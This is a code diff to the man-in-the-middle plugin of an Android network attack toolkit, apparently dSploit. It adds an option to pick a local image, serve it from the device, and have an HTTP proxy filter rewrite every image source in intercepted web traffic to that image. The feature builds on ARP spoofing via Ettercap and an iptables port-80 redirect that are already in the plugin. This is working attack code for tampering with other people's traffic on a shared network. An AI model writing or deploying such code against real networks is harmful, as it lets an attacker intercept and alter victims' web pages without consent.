@@ -25,7 +25,10 @@ import java.util.regex.PatternSyntaxException;
 import android.app.ProgressDialog;
 import android.content.Context;
 import android.content.Intent;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Bundle;
+import android.provider.MediaStore.MediaColumns;
 import android.util.Log;
 import android.view.LayoutInflater;
 import android.view.View;
@@ -50,11 +53,13 @@ import it.evilsocket.dsploit.net.Target;
 
 public class MITM extends Plugin 
 {
-	private static final String TAG = "MITM";
+	private static final String TAG 		   = "MITM";
+	private static final int    SELECT_PICTURE = 1010;
 	
 	private ListView      	  mActionListView = null;
 	private ActionAdapter 	  mActionAdapter  = null;
 	private ArrayList<Action> mActions  	  = new ArrayList<Action>();	
+	private Intent			  mImagePicker	  = null;
 	
 	static class Action
 	{
@@ -142,6 +147,58 @@ public class MITM extends Plugin
 	    );		
 	}
 	
+	@Override
+	protected void onActivityResult( int request, int result, Intent intent ) { 
+	    super.onActivityResult( request, result, intent  ); 
+
+	    if( request == SELECT_PICTURE && result == RESULT_OK )
+	    {
+	    	try
+	    	{
+		    	Uri    uri 		= intent.getData();
+		    	String fileName = null,
+		    		   mimeType = null;
+		    	
+		    	if( uri != null ) 
+		    	{
+		    		String[] columns = { MediaColumns.DATA };
+		            Cursor 	 cursor  = getContentResolver().query( uri, columns, null, null, null );
+		            cursor.moveToFirst();
+
+		            int index = cursor.getColumnIndex( MediaColumns.DATA );
+		            if( index != -1 ) 
+		            {
+		            	fileName = cursor.getString( index );
+		            } 
+		            
+		            cursor.close();
+		        }
+	            
+		    	if( fileName == null )
+		    	{
+		    		setStoppedState();
+		    		new ErrorDialog( "Error", "Could not determine file path.", MITM.this ).show();
+		    	}
+		    	else
+		    	{
+		    		mimeType = System.getImageMimeType( fileName );
+		    				
+		    		Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
+		    		
+		    		System.getServer().setResource( fileName, mimeType );
+		    		new Thread( System.getServer() ).start();
+		    		
+		    		HTTPFilter.start( System.getProxy(), "src=['\"][^'\"]+\\.(jpg|jpeg|png|gif)['\"]", "src=\"" + System.getServer().getResourceURL() + "\"" );
+		    	}		    	
+	    	}
+	    	catch( Exception e )
+	    	{
+	    		e.printStackTrace();
+	    		Log.e( TAG, e.toString() );
+	    	}
+	    }	    
+	}
+	
 	private void setStoppedState() {
 		int rows = mActionListView.getChildCount(),
 			i;
@@ -170,6 +227,7 @@ public class MITM extends Plugin
 			System.getEttercap().kill();
 			System.getIPTables().undoPortRedirect( 80, System.HTTP_PROXY_PORT );
 			System.getProxy().stop();
+			System.getServer().stop();
 			
 			for( i = 0; i < rows; i++ )
 			{
@@ -280,7 +338,12 @@ public class MITM extends Plugin
 				if( activity.getVisibility() == View.INVISIBLE )
 				{
 					setStoppedState();
+
+			    	activity.setVisibility( View.VISIBLE );
+
+					startActivityForResult( mImagePicker, SELECT_PICTURE );  
 					
+					/*
 					new InputDialog( "Image URL", "Enter the URL of an image, starting with 'http://' :", "http://www.evilsocket.net/trollface.png", true, MITM.this, new InputDialogListener(){
 						@Override
 						public void onInputEntered( String input ) 
@@ -298,6 +361,7 @@ public class MITM extends Plugin
 								new ErrorDialog( "Error", "Invalid image url.", MITM.this ).show();
 						}} 
 					).show();	
+					*/
 				}
 				else
 				{					
@@ -408,7 +472,11 @@ public class MITM extends Plugin
         mActionListView = ( ListView )findViewById( R.id.actionListView );
         mActionAdapter  = new ActionAdapter( R.layout.plugin_mitm_list_item, mActions );
         
-        mActionListView.setAdapter( mActionAdapter );               
+        mActionListView.setAdapter( mActionAdapter );     
+        
+		mImagePicker = new Intent( Intent.ACTION_PICK, android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI );
+		mImagePicker.setType("image/*");
+		mImagePicker.putExtra( Intent.EXTRA_LOCAL_ONLY, true );
 	}
 	
 	@Override
